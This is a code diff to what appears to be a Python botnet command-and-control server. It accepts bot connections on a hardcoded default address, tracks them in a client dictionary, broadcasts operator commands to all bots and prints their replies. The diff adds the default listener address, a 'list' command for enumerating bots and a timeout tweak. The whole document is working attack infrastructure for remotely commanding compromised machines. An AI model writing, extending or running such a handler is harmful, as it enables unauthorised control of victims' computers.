@@ -12,7 +12,12 @@ ClientDict = {}
 
 def main():
     if (len(sys.argv) < 3):
-        print ("[!] Usage:\n [+] python3 {} <LHOST> <LPORT>\n".format(sys.argv[0]))
+        try:
+            lhost = "192.168.56.112"
+            lport = 8008
+            listener(lhost,lport, q)
+        except Exception as ex:
+            print("\n[-] Unable to run the handler. Reason: {}\n".format(str(ex)))
     else:
         try:
             lhost = sys.argv[1]
@@ -34,7 +39,7 @@ def listener(lhost,lport,q):
     BotCmdThread.start()
     while True:
         (client, client_address) = server.accept()
-        newthread = BotHandler(client,client_address, q, ClientDict)
+        newthread = BotHandler(client, client_address, q, ClientDict)
         SocketThread.append(newthread)
         newthread.start()
 
@@ -55,6 +60,9 @@ class BotCmd(threading.Thread):
                     self.q.put(SendCmd+"\n")
                 time.sleep(1)
                 os._exit(0)
+            elif (SendCmd == "list"):
+                print("[!] Bots: {}".format(ClientDict))
+                pass
             else:
                 print("[+] Sending Command: {} to {} bots.".format(SendCmd,str(len(SocketThread))))
                 for _ in range(len(SocketThread)):
@@ -80,8 +88,8 @@ class BotHandler(threading.Thread):
                 RecvBotCmd = self.q.get()
                 try:
                     self.client.send(RecvBotCmd.encode('utf-8'))
-                    self.client.settimeout(1)
                     try:
+                        self.client.settimeout(1)
                         resp = self.client.recv(1024).decode('utf-8')
                         print("\n[+] {} reponse: {}".format(BotName, resp))
                     except:
